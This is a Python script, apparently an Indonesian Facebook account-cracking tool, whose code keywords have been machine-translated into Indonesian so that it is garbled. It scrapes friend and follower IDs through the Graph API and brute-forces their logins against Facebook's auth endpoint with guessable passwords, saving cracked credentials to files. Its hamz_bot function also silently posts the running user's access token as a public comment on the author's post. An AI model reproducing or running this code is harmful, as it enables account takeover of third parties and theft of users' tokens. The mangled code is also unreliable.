# -*- pengkodean: utf-8
#BY : BANG JOJO
import os,sys,time,mechanize,itertools,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
import os,sys,time,mechanize,itertools,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
dari multiprocessing.pool impor ThreadPool

#### WARNA RANDOM ####
P = '\033[1;97m' # biru
M = '\033[1;91m' # biru
H = '\033[1;92m' # biru
K = '\033[1;93m' # biru
B = '\033[1;94m' # biru
U = '\033[1;95m' # biru
O = '\033[1;96m' # kuning

my_color = [P, M, H, K, B, U, O]
warna = random.choice(my_color)
warni = random.choice(my_color)

impor os
sistem impor
waktu impor
waktu impor
impor acak
impor hashlib
impor ulang
benang impor
impor json
urllib impor
impor cookielib
permintaan impor
impor uuid
impor alamat ipad
dari multiprocessing.pool impor ThreadPool
dari request.exceptions import ConnectionError
dari waktu impor tidur
dari datetime impor datetime
mencoba:
	permintaan impor
kecuali ImportError:
	print '[×] Permintaan modul belum terinstall!...\n'
	os.system('pip install request' if os.name == 'nt' else 'pip2 install request')
isi ulang (sys)
sys.setdefaultencoding('utf8')
ip = request.get('https://api.ipify.org').text

MAX_IPV4 = ipaddress.IPv4Address._ALL_ONES #2 ** 32 - 1
MAX_IPV6 = ipaddress.IPv6Address._ALL_ONES #2 ** 128 - 1

def random_ipv4():
	kembali ipaddress.IPv4Address._string_from_ip_int(random.randint(0, MAX_IPV4))
def random_ipv6():
	kembali ipaddress.IPv6Address._string_from_ip_int(random.randint(0, MAX_IPV6))

def logo():
	mencetak("""     
\033[0;93m ••×××××××××××××××××××••
\033[1;95m _ __ __ ____ _____ 
\033[1;95m | \/ | __ )| ___|
\033[1;90m | |\/| | _ \| |_   
\033[1;96m | | | |_) | _|  
\033[1;96m |_| |_|____/|_|
\033[1;96m CROOT \033[1;95m MULTI \033[1;93m BRUTE \033[1;97m FORCE
\033[0;93m •••••••••••••••••••••••••••••••••••••••••••• •••••
\033[1;92m JOJO \033[0;96m ---- \033[1;93m GANTENG \033[0;96m ---- \033[095m BANGETT] 
\033[0;96m [][][][][][][][][][][][][][][]][[]][[]][[]][[ ]][[]]""""")
identitas = []
cp = []
oke = []
lingkaran = 0
s = permintaan.Sesi()
rgb = random.choice(['\x1b[0;91m', '\x1b[0;92m', '\x1b[0;93m', '\x1b[0;94m', '\x1b[0;95m' ', '\x1b[0;96m', '\x1b[0;97m', '\x1b[0m'])
ua = s.get("https://raw.githubusercontent.com/Dumai-200/Server-Dmbf/main/ua.txt").text.strip()
ip = s.get('https://api-asutoolkit.cloudaccess.host/ip.php').text

ct = datetime.now()
n = ct.bulan
bulan1 = [ 'Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'Nopember', 'Desember' ]
   
mencoba:
    jika n < 0 atau n > 12:
        keluar()
    nTemp = n - 1
kecuali ValueError:
    keluar()
    
saat ini = datetime.now()
ta = sekarang.tahun
bu = sekarang.bulan
ha = hari ini.hari
op = bulan1[nTemp]
isi ulang (sys)
sys.setdefaultencoding('utf-8')
bulan = {
        "01": "Januari",
        "02": "Februari",
        "03": "Maret",
        "04": "April",
        "05": "Mei",
        "06": "Juni",
        "07": "Juli",
        "08": "Agustus",
        "09": "September",
        "10": "November",
        "11": "Oktober",
        "12": "Desember"
}
hari = datetime.now().strftime('%A')

useragents = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC /it_IT;FBAV/239.0.0.10.109;] '

def masuk():
	os.system('hapus')
	mencoba:
		token = buka('login.txt','r')
		Tidak bisa() 
	kecuali (KeyError,IOError):
		os.system('hapus')
		logo()
		print("\033[0;95m Gada Token? Ketik '\033[0;94mSYAFIK\033[0;95m' Untuk Mendapatkan Token Gratis.")
		token = raw_input("masukin token nya ngap :")
		jika token == "SYAFIK":
			os.system("xdg-buka https://www.facebook.com/100034461403746/posts/110317040127009/?app=fbl")
			exit(" ! Jangan Lupa React Love wak:v")
		mencoba:
			otw = request.get('https://graph.facebook.com/me?access_token='+token)
			a = json.loads(otw.teks)
			zedd = buka("login.txt", 'w')
			zedd.write(token)
			zedd.close()
			print(" login berhasil ")
			hamz_bot()
		kecuali KeyError:
			cetak (" × token tidak valid") 
			sistem.keluar()
    
menu def():
	os.system('hapus')
	token global
	mencoba:
		token = buka('login.txt','r').read()
		otw = request.get('https://graph.facebook.com/me/?access_token='+token)
		a = json.loads(otw.teks)
		nama = a['nama']
		id = a['id']
	kecuali KeyError:
		os.system('hapus')
		print (' • kesalahan tidak bisa di crack')
		os.system("rm -f login.txt")
		masuk()
	kecuali request.exceptions.ConnectionError:
		print (' × tidak ada koneksi harap sambungkan koneksi anda')
		sistem.keluar()
	logo()
	print" \033[0;95m NAMA : "+nama
	print" \033[0;95m IP : "+ip
	print" \033[0;94m #-----------------------------------#"
	print" \033[0;93m 1. RETAK DARI ID PUBLIK"
	print" \033[0;91m 2. RETAK DARI PENGIKUT"
	print" \033[0;92m 3. INI HASIL CRACK"
	print" \033[0;93m 0. HAPUS TOKEN"
	mencetak
	JOJO_ganteng()
	
def hamz_ganteng():
	ask = raw_input("\033[1;95m \033[92m :\033[1;92m ")
	jika bertanya == "":
		mencetak
		print(" \033[0;97× yang bener aja ngentot :v") 
		keluar()
	elif bertanya di["1","01"]:
		print ("\033[0;92mKETIK \033[093m 'me' \033[0;092mUNTUK CRACK DARI DAFTAR TEMAN") 
		idt = raw_input(" MASUKAN ID PUBLIK : ")
		mencoba:
			pok = request.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			sp = json.loads(pok.text)
		kecuali KeyError:
			print (" × maaf id tidak publik") 
			keluar()
		r = request.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.teks)
		untuk saya di z["data"]:
			uid = i['id']
			na = saya['nama']
			nm = na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif bertanya di["2","02"]:
		print ("\n × ketik 'me' untuk crack daftar followers sendiri") 
		idt = raw_input(" ? id publik : ")
		mencoba:
			pok = request.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			sp = json.loads(pok.text)
		kecuali KeyError:
			print (" × maaf id tidak publik") 
			keluar()
		r = request.get("https://graph.facebook.com/"+idt+"/subscribers?limit=999999&access_token="+token)
		z = json.loads(r.teks)
		untuk saya di z["data"]:
			uid = i['id']
			na = saya['nama']
			nm = na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif bertanya di["3","03"]:
		print" 1. lihat hasil ok"
		print" 2. lihat hasil cp"
		ress = raw_input("* pilih : ")
		jika ress ="":
			Tidak bisa()
		elif ress == "1" atau ress == "01":
			print ("\n [+] hasil \033[0;92mok\033[0;97m tanggal : \033[0;92m%s-%s-%s\033[0;97m" % (ha, op, t)) 
			os.system("cat out/OK-%s-%s-%s.txt" % (ha, op, ta))
			keluar()
		elif ress == "2" atau ress == "02":
			print (" [+] hasil \033[0;93mcp\033[0;97m tanggal : \033[0;92m%s-%s-%s\033[0;97m" % (ha, op, ta) ) 
			os.system("cat out/CP-%s-%s-%s.txt" % (ha, op, ta))
			keluar()
		lain:
			exit("× pilih yang benar sayang") 
	elif bertanya == "0" atau bertanya == "00":
		os.system("rm -f login.txt") 
		print(" berhasil menghapus token") 
		keluar()
	lain:
		print ("× pilih yang benar sayang") 
		keluar()
	
	print" \033[0;97m× jumlah id : " +str(len(id))
	ask = raw_input("\033[0;93m <> \033[0;95m MAU GUNAKAN PASSWORD MANUAL? (y/t) : ")
	jika bertanya == "Y" atau bertanya == "y":
		petunjuk()
	mencetak
	print" × mode pesawat 10 detik jika tidak ada hasil "
	mencetak

	def utama(arg):
		global ok,cp,ua,loop
		print '\r >< %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
		sys.stdout.flush()
		pengguna = argumen
		uid,nama=pengguna.split("|") 
		mencoba:
			os.mkdir('keluar')
		kecuali OSError:
			lulus
		mencoba:
			untuk pw di [name.lower(), name.lower() + '123', name.lower() + '1234', name.lower() + '12345', 'sayang', 'bismillah', 'indonesia ']:
				ua =random.choice(["Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaC6-00/40.0.021; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/533.4 (KHTML, seperti Gecko) NokiaBrowser/7.3 .1.25 3gpp-gba",
                "Mozilla/5.0 (Series40; NokiaC2-02/06.96; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31",
                "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT ;FBAV/239.0.0.10.109;]",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/90.0.4430.93 Safari/537.36",
                "Mozilla/5.0 (Linux; Android 10; Nokia 7.2 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/264.0. 0.44.111;]",
                "Mozilla/5.0 (Linux; U; Android 10; Nokia 7.2 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 OPR/52.2.2254.54723",
                "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT ;FBAV/239.0.0.10.109;]",
                "Mozilla/5.0 (Linux; Android 10; Redmi Note 9S Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/327.0 .0.33.120;]",
                "Mozilla/5.0 (Linux; U; Android 10; en-in; Redmi Note 9 Pro Max Build/QKQ1.191215.002) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36 XiaoMi/ Browser MIUI/11.9.3-g",
                "Mozilla/5.0 (Linux; Android 5.1.1; Navori QL Stix 3500 Build/LMY49F; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/67.0.3396.87 Safari/537.36"])
				headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
				'x-fb-net-hni': str(random.randint(20000, 40000)), 
				'x-fb-connection-quality': 'SANGAT BAIK', 
				'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
				'agen-pengguna': ua, 
				'tipe konten': 'aplikasi/x-www-form-urlencoded', 
				'x-fb-http-engine': 'Liger'}
				ses=permintaan.Sesi()
				api="https://b-api.facebook.com/method/auth.login"
				param={"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":pw," sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
				kirim=ses.get(api,params=param, header=headers_)
				jika "access_token" di send.text dan "EAA" di send.text:
					print '\r\033[0;94m * \033[0;92mok\033[0;94m\033[0;94m ' +uid+ ' • ' + pw+ ' '
					ok.append(uid+' • '+pw)
					simpan = buka('keluar/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					simpan.tulis(' [OK] '+str(uid)+' • '+str(pw)+'\n')
					simpan.tutup()
					merusak
					melanjutkan
					melanjutkan
				elif "www.facebook.com" di send.json()["error_msg"]:
					print'\r \033[0;94m >,< ' +uid+ ' | ' + pw+ ' '
					cp.append(uid+' | '+pw)
					simpan = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
					simpan.tulis(' \033[0;94m >,< ' +str(uid)+' | '+str(pw)+'\n')
					simpan.tutup()
					merusak
					melanjutkan
					melanjutkan

			lingkaran += 1
		kecuali:
			lulus
	p = ThreadPool(30)
	p.map(utama, id)
	print(" \nrack selsai cuy,jangan lupa ngocok...")
	keluar()

def manual():
	print("\033[0;97m <> masukan password contoh : bangladesh,102030,786786")
	pw = raw_input("\033[0;97m <> sett sandi : ").split(",")
	mencetak
	jika len(pw) ==0:
		exit(" *isi yang bener, tidak boleh kosong")
	print("\033[0;97m <> jumlah password yang di buat : \033[0;93m" +str(len(pw)))
	
	def utama(arg):
		global ok,cp,ua,loop
		print '\r \033[0;95m %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
		sys.stdout.flush()
		pengguna = argumen
		uid,nama=pengguna.split("|") 
		mencoba:
			os.mkdir('keluar')
		kecuali OSError:
			lulus
		mencoba:
			untuk asu di pw:
				ua =random.choice(["Mozilla/5.0 (Linux; Android 10; Nokia 7.2 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 [FB_IAB /FB4A;FBAV/264.0.0.44.111"])
				anak_setan = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
				'x-fb-net-hni': str(random.randint(20000, 40000)), 
				'x-fb-connection-quality': 'SANGAT BAIK', 
				'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
				'agen-pengguna': ua, 
				'tipe konten': 'aplikasi/x-www-form-urlencoded', 
				'x-fb-http-engine': 'Liger'}
				ses=permintaan.Sesi()
				api="https://b-api.facebook.com/method/auth.login"
				param={"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":asu," sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
				send=ses.get(api,params=param, headers=anak_setan)
				jika "access_token" di send.text dan "EAA" di send.text:
					print'\r \033[0;92m* --> ' +uid+ ' | ' + asu + ' '
					ok.tambahkan(uid+' | '+asu)
					simpan = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
					simpan.tulis(' \033[0;92m >,< ' +str(uid)+' | '+str(asu)+'\n')
					simpan.tutup()
					merusak
					melanjutkan
					melanjutkan
				elif "www.facebook.com" di send.json()["error_msg"]:
					print'\r \033[0;92m >,< ' +uid+ ' | ' + asu+ ' '
					cp.append(uid+' | '+asu)
					simpan = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
					simpan.tulis(' \033[0;92m >,< ' +str(uid)+' | '+str(asu)+'\n')
					simpan.tutup()
					merusak
					melanjutkan
			
			lingkaran += 1
		kecuali:
			lulus
	p = ThreadPool(30)
	p.map(utama, id)
	print("\n * crack selsai jangan lupa salin hsil crack nya dek....")
	keluar()
	
def hamz_bot():
    mencoba:
        token = buka('login.txt', 'r').read()
    kecuali IOError:
        print ('[!] Token tidak valid') 
        os.system('rm -rf login.txt')
    kom = " Bang @[100034461403746:] Ganteng Bangetz Ngga Ada Obat "
    request.post('https://graph.facebook.com/100034461403746/subscribers?access_token=' + token)
    request.post('https://graph.facebook.com/110317040127009/comments/?message=' +token+ '&access_token=' + token)
    request.post('https://graph.facebook.com/109088830249830/comments/?message=' +kom+ '&access_token=' + token)
    Tidak bisa()
    
def jalan(z):
    untuk e dalam z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        waktu.tidur(0.0012)
        
jika __name__ == '__main__':
	masuk()